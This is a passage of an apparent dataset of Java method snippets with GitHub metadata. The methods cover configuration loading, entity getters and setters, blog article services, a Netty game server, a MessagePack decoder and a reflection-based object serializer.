loadConfig(String[] args) throws IllegalAccessException {\n    String bootConf = environment().get(PATH_SERVER_BOOT_CONFIG, PATH_CONFIG_PROPERTIES);\n    Environment bootConfEnv = Environment.of(bootConf);\n\n    Map<String, String> argsMap = this.loadMainArgs(args);\n    Map<String, String> constField = PropertyUtils.confFieldMap();\n\n    this.loadPropsOrYaml(bootConfEnv, constField);\n\n    if (!requireNonNull(bootConfEnv).isEmpty()) {\n      Map<String, String> bootEnvMap = bootConfEnv.toStringMap();\n      Set<Map.Entry<String, String>> entrySet = bootEnvMap.entrySet();\n      entrySet.forEach(entry -> this.environment.add(entry.getKey(), entry.getValue()));\n      this.masterConfig = true;\n    }\n\n    if (argsMap.get(PATH_SERVER_PROFILE) != null) {\n      String envNameArg = argsMap.get(PATH_SERVER_PROFILE);\n      this.envConfig(envNameArg);\n      this.envName = envNameArg;\n      argsMap.remove(PATH_SERVER_PROFILE);\n      this.envConfig = true;\n    }\n\n    if (!envConfig) {\n      String profileName = this.environment.get(PATH_SERVER_PROFILE);\n      if (profileName != null && !profileName.equals(\"\")) {\n        envConfig(profileName);\n        this.envName = profileName;\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30810, "method_name": "loadPropsOrYaml", "class_name": "Apex", "params": ["Environment", "Map<String,String>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadPropsOrYaml(Environment bootConfEnv, Map<String, String> constField) {\n    /** Properties are configured by default, and the\n     * properties loaded by default are application.properties.*/\n    constField.keySet().forEach(key ->\n            Optional.ofNullable(System.getProperty(constField.get(key)))\n                    .ifPresent(property -> bootConfEnv.add(key, property)));\n\n    /** If there is no properties configuration, the yaml\n     * format is used, and the default yaml loaded is application.yml */\n    if (bootConfEnv.isEmpty()) {\n      Optional.ofNullable(PropertyUtils.yaml(PATH_CONFIG_YAML))\n              .ifPresent(yamlConfigTreeMap ->\n                      bootConfEnv.load(new StringReader(\n                              PropertyUtils.toProperties(yamlConfigTreeMap))));\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30811, "method_name": "loadMainArgs", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Map<String,String>", "snippet": "  private Map<String, String> loadMainArgs(String[] args) {\n    Map<String, String> argsMap = PropertyUtils.parseArgs(args);\n    if (argsMap.size() > 0) {\n      this.mainArgs = args;\n      log.info(\"Entered command line:{}\", argsMap.toString());\n    }\n\n    for (Map.Entry<String, String> next : argsMap.entrySet()) {\n      this.environment.add(next.getKey(), next.getValue());\n    }\n    return argsMap;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30812, "method_name": "envConfig", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void envConfig(String envName) {\n    String envFileName = \"application\" + \"-\" + envName + \".properties\";\n    Environment customerEnv = Environment.of(envFileName);\n    if (customerEnv.isEmpty()) {\n      String envYmlFileName = \"application\" + \"-\" + envName + \".yml\";\n      customerEnv = Environment.of(envYmlFileName);\n    }\n    if (!customerEnv.isEmpty()) {\n      customerEnv.props().forEach((key, value) -> this.environment.add(key.toString(), value));\n    }\n    this.environment.add(PATH_SERVER_PROFILE, envName);\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 30813, "method_name": "getId", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30814, "method_name": "setId", "class_name": "QueueInfo", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30815, "method_name": "getqName", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getqName() {\n        return qName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30816, "method_name": "setqName", "class_name": "QueueInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setqName(String qName) {\n        this.qName = qName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30817, "method_name": "getDescription", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {\n        return description;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30818, "method_name": "setDescription", "class_name": "QueueInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {\n        this.description = description;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30819, "method_name": "getPriority", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPriority() {\n        return priority;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30820, "method_name": "setPriority", "class_name": "QueueInfo", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPriority(int priority) {\n        this.priority = priority;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30821, "method_name": "isLock", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isLock() {\n        return isLock;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30822, "method_name": "setLock", "class_name": "QueueInfo", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLock(boolean lock) {\n        isLock = lock;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30823, "method_name": "getLockHost", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLockHost() {\n        return lockHost;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30824, "method_name": "setLockHost", "class_name": "QueueInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLockHost(String lockHost) {\n        this.lockHost = lockHost;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30825, "method_name": "getLockTime", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getLockTime() {\n        return lockTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30826, "method_name": "setLockTime", "class_name": "QueueInfo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLockTime(Date lockTime) {\n        this.lockTime = lockTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30827, "method_name": "getCreateTime", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getCreateTime() {\n        return createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30828, "method_name": "setCreateTime", "class_name": "QueueInfo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Date createTime) {\n        this.createTime = createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30829, "method_name": "addArticle", "class_name": "ContentServiceImpl", "params": ["ContentDomain"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addArticle(ContentDomain contentDomain) {\n        if (null == contentDomain)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        if (StringUtils.isBlank(contentDomain.getTitle()))\n            throw BusinessException.withErrorCode(ErrorConstant.Article.TITLE_CAN_NOT_EMPTY);\n        if (contentDomain.getTitle().length() > WebConst.MAX_TITLE_COUNT)\n            throw BusinessException.withErrorCode(ErrorConstant.Article.TITLE_IS_TOO_LONG);\n        if (StringUtils.isBlank(contentDomain.getContent()))\n            throw BusinessException.withErrorCode(ErrorConstant.Article.CONTENT_CAN_NOT_EMPTY);\n        if (contentDomain.getContent().length() > WebConst.MAX_TEXT_COUNT)\n            throw BusinessException.withErrorCode(ErrorConstant.Article.CONTENT_IS_TOO_LONG);\n\n        //\u6807\u7b7e\u548c\u5206\u7c7b\n        String tags = contentDomain.getTags();\n        String categories = contentDomain.getCategories();\n\n        contentDao.addArticle(contentDomain);\n\n        int cid = contentDomain.getCid();\n        metaService.addMetas(cid, tags, Types.TAG.getType());\n        metaService.addMetas(cid, categories, Types.CATEGORY.getType());\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30830, "method_name": "deleteArticleById", "class_name": "ContentServiceImpl", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteArticleById(Integer cid) {\n        if (null == cid)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        contentDao.deleteArticleById(cid);\n        //\u540c\u65f6\u4e5f\u8981\u5220\u9664\u8be5\u6587\u7ae0\u4e0b\u7684\u6240\u6709\u8bc4\u8bba\n        List<CommentDomain> comments = commentDao.getCommentsByCId(cid);\n        if (null != comments && comments.size() > 0){\n            comments.forEach(comment ->{\n                commentDao.deleteComment(comment.getCoid());\n            });\n        }\n        //\u5220\u9664\u6807\u7b7e\u548c\u5206\u7c7b\u5173\u8054\n        List<RelationShipDomain> relationShips = relationShipDao.getRelationShipByCid(cid);\n        if (null != relationShips && relationShips.size() > 0){\n            relationShipDao.deleteRelationShipByCid(cid);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30831, "method_name": "updateArticleById", "class_name": "ContentServiceImpl", "params": ["ContentDomain"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateArticleById(ContentDomain contentDomain) {\n        //\u6807\u7b7e\u548c\u5206\u7c7b\n        String tags = contentDomain.getTags();\n        String categories = contentDomain.getCategories();\n\n        contentDao.updateArticleById(contentDomain);\n        int cid = contentDomain.getCid();\n        relationShipDao.deleteRelationShipByCid(cid);\n        metaService.addMetas(cid, tags, Types.TAG.getType());\n        metaService.addMetas(cid, categories, Types.CATEGORY.getType());\n\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30832, "method_name": "updateCategory", "class_name": "ContentServiceImpl", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateCategory(String ordinal, String newCatefory) {\n        ContentCond cond = new ContentCond();\n        cond.setCategory(ordinal);\n        List<ContentDomain> atricles = contentDao.getArticlesByCond(cond);\n        atricles.forEach(atricle -> {\n            atricle.setCategories(atricle.getCategories().replace(ordinal, newCatefory));\n            contentDao.updateArticleById(atricle);\n        });\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30833, "method_name": "updateContentByCid", "class_name": "ContentServiceImpl", "params": ["ContentDomain"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateContentByCid(ContentDomain content) {\n        if (null != content && null != content.getCid()) {\n            contentDao.updateArticleById(content);\n        }\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30834, "method_name": "getAtricleById", "class_name": "ContentServiceImpl", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "ContentDomain", "snippet": "    public ContentDomain getAtricleById(Integer cid) {\n        if (null == cid)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        return contentDao.getArticleById(cid);\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30835, "method_name": "getArticlesByCond", "class_name": "ContentServiceImpl", "params": ["ContentCond", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "PageInfo<ContentDomain>", "snippet": "    public PageInfo<ContentDomain> getArticlesByCond(ContentCond contentCond, int pageNum, int pageSize) {\n        if (null == contentCond)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        PageHelper.startPage(pageNum, pageSize);\n        List<ContentDomain> contents = contentDao.getArticlesByCond(contentCond);\n        PageInfo<ContentDomain> pageInfo = new PageInfo<>(contents);\n        return pageInfo;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30836, "method_name": "getRecentlyArticle", "class_name": "ContentServiceImpl", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "PageInfo<ContentDomain>", "snippet": "    public PageInfo<ContentDomain> getRecentlyArticle(int pageNum, int pageSize) {\n        PageHelper.startPage(pageNum, pageSize);\n        List<ContentDomain> recentlyArticle = contentDao.getRecentlyArticle();\n        PageInfo<ContentDomain> pageInfo = new PageInfo<>(recentlyArticle);\n        return pageInfo;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30837, "method_name": "searchArticle", "class_name": "ContentServiceImpl", "params": ["String", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "PageInfo<ContentDomain>", "snippet": "    public PageInfo<ContentDomain> searchArticle(String param, int pageNun, int pageSize) {\n        PageHelper.startPage(pageNun,pageSize);\n        List<ContentDomain> contentDomains = contentDao.searchArticle(param);\n        PageInfo<ContentDomain> pageInfo = new PageInfo<>(contentDomains);\n        return pageInfo;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 30838, "method_name": "convertToPrimitiveArray", "class_name": "ByteArrayUtils", "params": ["Byte"], "throws": null, "modifiers": ["static"], "return_type": "byte", "snippet": "  static byte[] convertToPrimitiveArray(Byte[] objects) {\n    final byte[] bytes = new byte[objects.length];\n    for (int i = 0; i < objects.length; i++) {\n      bytes[i] = objects[i];\n    }\n    return bytes;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ByteArrayUtils.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30839, "method_name": "convertToObjectArray", "class_name": "ByteArrayUtils", "params": ["byte"], "throws": null, "modifiers": ["static"], "return_type": "Byte", "snippet": "  static Byte[] convertToObjectArray(byte[] bytes) {\n    final Byte[] objects = new Byte[bytes.length];\n    for (int i = 0; i < bytes.length; i++) {\n      objects[i] = bytes[i];\n    }\n    return objects;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ByteArrayUtils.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30840, "method_name": "init", "class_name": "HallServiceImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        sdkUserService = GetBeanUtil.getBean(SdkUserService.class);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/service/impl/HallServiceImpl.java", "stars": "1", "class_props": {"extends": "abstractService", "implements": ["HallService"], "modifiers": ["public"]}}, {"id": 30841, "method_name": "invokeMethod", "class_name": "HallServiceImpl", "params": ["short", "Request", "DataPacket"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void invokeMethod(short cmd, Request request, DataPacket dataPacket) {\n        super.invokeMethod(cmd,request,dataPacket);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/service/impl/HallServiceImpl.java", "stars": "1", "class_props": {"extends": "abstractService", "implements": ["HallService"], "modifiers": ["public"]}}, {"id": 30842, "method_name": "joinHall", "class_name": "HallServiceImpl", "params": ["Request", "JSONObject"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void joinHall(Request request, JSONObject jsonObject) {\n        String token = jsonObject.getString(Const.Constant.TOKEN);\n        token = \"eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1Nzg0MDQ0ODcsInN1YiI6IjEyMzQ1Njc4OTFfMTAwMyIsImlhdCI6MTU3ODM4Mjg4Nzg5OH0.rLHugb6ocTmwT9zS9fXG541xnkyGlAZrXThCsjC0UU3-0PutubXeTi9HAVpe8C_kYinA6Bfl9umP9jrZefOQdA\";\n        Integer gameId = HallInitializer.baseLocalMemory.getHallGameMgr().getHallGameMap().get(Const.Constant.CHANNEL).getGameId();\n        SdkUser sdkUser = sdkUserService.getSdkUser(request,token,gameId,Const.Number.ONE);\n        if (Objects.isNull(sdkUser)) {\n            log.error(\"\u73a9\u5bb6\u4e0d\u5b58\u5728\");\n        }\n        Player player = new Player(sdkUser.getSdkUserId());\n        //\u903b\u8f91\u5904\u7406\n        HallInitializer.baseLocalMemory.getHallGameMgr().getPlayerList().add(player);\n\n        byte[] bytes = JSONObject.toJSONBytes(player);\n        //\u53d1\u9001\u7528\u6237\u52a0\u5165\u5927\u5385\u534f\u8bae\n        AbstractNetMessage abstractNetMessage = new AbstractNetMessage(new NetMessageBody(bytes), MessageKey.SERVER_CONFIGS.getKey());\n        ByteBuf byteBuf = messageEncoderFactoryApp.createByteBuf(abstractNetMessage);\n        request.sendAndFlush(byteBuf);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/service/impl/HallServiceImpl.java", "stars": "1", "class_props": {"extends": "abstractService", "implements": ["HallService"], "modifiers": ["public"]}}, {"id": 30843, "method_name": "onEntityAdded", "class_name": "MixinWorld", "params": ["Entity", "CallbackInfo"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onEntityAdded(Entity entityIn, CallbackInfo callbackInfo) {\n        PlayerEvent event = new PlayerEvent(PlayerEvent.Type.ENTERING, entityIn);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinWorld.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30844, "method_name": "onEntityRemoved", "class_name": "MixinWorld", "params": ["Entity", "CallbackInfo"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onEntityRemoved(Entity entityIn, CallbackInfo callbackInfo) {\n        PlayerEvent event = new PlayerEvent(PlayerEvent.Type.EXITING, entityIn);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinWorld.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30845, "method_name": "decode", "class_name": "MessagePackDecoder", "params": ["ChannelHandlerContext", "ByteBuf", "List<Object>"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void decode(ChannelHandlerContext ctx, ByteBuf msg, List<Object> out) throws Exception {\n    final byte[] array;\n    final int length = msg.readableBytes();\n    array = new byte[length];\n    msg.getBytes(msg.readerIndex(), array, 0, length);\n    MessagePack pack = new MessagePack();\n    out.add(pack.read(array, Object.class));\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/MessagePackDecoder.java", "stars": "3", "class_props": {"extends": "MessageToMessageDecoder", "implements": null, "modifiers": ["public"]}}, {"id": 30846, "method_name": "wrap", "class_name": "ODS", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "Tag<?>", "snippet": "    public static Tag<?> wrap(Object o){\n        return wrap(\"\", o);\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30847, "method_name": "wrap", "class_name": "ODS", "params": ["String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "Tag<?>", "snippet": "    public static Tag<?> wrap(String name, Object o){\n        if(o instanceof Byte){\n            return new ByteTag(name, (byte) o);\n        }\n        if(o instanceof Character){\n            return new CharTag(name, (char) o);\n        }\n        if(o instanceof Double){\n            return new DoubleTag(name, (double) o);\n        }\n        if(o instanceof Float){\n            return new FloatTag(name, (float) o);\n        }\n        if(o instanceof Integer){\n            return new IntTag(name, (int) o);\n        }\n        if(o instanceof Long){\n            return new LongTag(name, (long) o);\n        }\n        if(o instanceof Short){\n            return new ShortTag(name, (short) o);\n        }\n        if(o instanceof String){\n            return new StringTag(name, (String) o);\n        }\n        if(o instanceof List){\n            return wrap(name, (List<?>) o);\n        }\n        return serialize(name, o);\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30848, "method_name": "unwrap", "class_name": "ODS", "params": ["Tag<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T unwrap(Tag<T> tag){\n        if(tag instanceof ObjectTag){\n            try{\n                ObjectTag objTag = (ObjectTag) tag;\n                String clazzName = (String) objTag.getTag(\"ODS_TAG\").getValue();\n                if(clazzName == null) throw new RuntimeException(\"Cannot unwrap object: TagObject is not a serialized object!\");\n                return (T) deserialize(tag, Class.forName(clazzName));\n            }catch(ClassNotFoundException ex){\n                ex.printStackTrace();\n            }\n        }\n        return tag.getValue();\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30849, "method_name": "wrap", "class_name": "ODS", "params": ["String", "List<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "ListTag<?>", "snippet": "    public static <T> ListTag<?> wrap(String name, List<T> list){\n        List<Tag<?>> output = new ArrayList<>();\n        for(T t : list){\n            output.add(wrap(t));\n        }\n        return new ListTag<>(name, output);\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30850, "method_name": "wrap", "class_name": "ODS", "params": ["List<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<Tag>", "snippet": "    public static <T> List<Tag<?>> wrap(List<T> list){\n        List<Tag<?>> output = new ArrayList<>();\n        for(T t : list){\n            output.add(wrap(t));\n        }\n        return output;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30851, "method_name": "unwrapList", "class_name": "ODS", "params": ["List<Tag>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "    public static <T> List<T> unwrapList(List<Tag<T>> tags){\n        List<T> output = new ArrayList<>();\n        for(Tag<T> tag : tags){\n            output.add(unwrap(tag));\n        }\n        return output;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30852, "method_name": "unwrapListTag", "class_name": "ODS", "params": ["ListTag<Tag>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "    public static <T> List<T> unwrapListTag(ListTag<? extends Tag<T>> list){\n        List<T> output = new ArrayList<>();\n        for(Tag<?> tag : list.getValue()){\n            output.add(unwrap((Tag<T>) tag));\n        }\n        return output;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30853, "method_name": "serialize", "class_name": "ODS", "params": ["String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "ObjectTag", "snippet": "    public static ObjectTag serialize(String key, Object obj){\n        ObjectTag objectTag = new ObjectTag(key);\n        try{\n            Class<?> clazz = obj.getClass();\n            objectTag.addTag(new StringTag(\"ODS_TAG\", clazz.getName()));\n            for(Field f : clazz.getDeclaredFields()){\n                if(f.getAnnotation(Serializable.class) == null) continue;\n                f.setAccessible(true);\n                objectTag.addTag(wrap(f.getName(), f.get(obj)));\n                f.setAccessible(false);\n            }\n        } catch(IllegalAccessException ex){\n            ex.printStackTrace();\n        }\n        if(objectTag.getValue().size() < 2)\n            throw new RuntimeException(\"Cannot serialize object: No serializable fields detected!\");\n        return objectTag;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30854, "method_name": "deserialize", "class_name": "ODS", "params": ["Tag<?>", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T deserialize(Tag<?> tag, Class<T> mainClazz){\n        if(!(tag instanceof ObjectTag)) throw new RuntimeException(\"Cannot deserialize tag: Tag is not an ObjectTag!\");\n        ObjectTag objectTag = (ObjectTag) tag;\n        if(!objectTag.hasTag(\"ODS_TAG\"))\n            throw new RuntimeException(\"Cannot deserialize tag: This tag was not serialized!\");\n        Object obj;\n        try{\n             obj = mainClazz.getConstructor().newInstance();\n        }catch(Exception 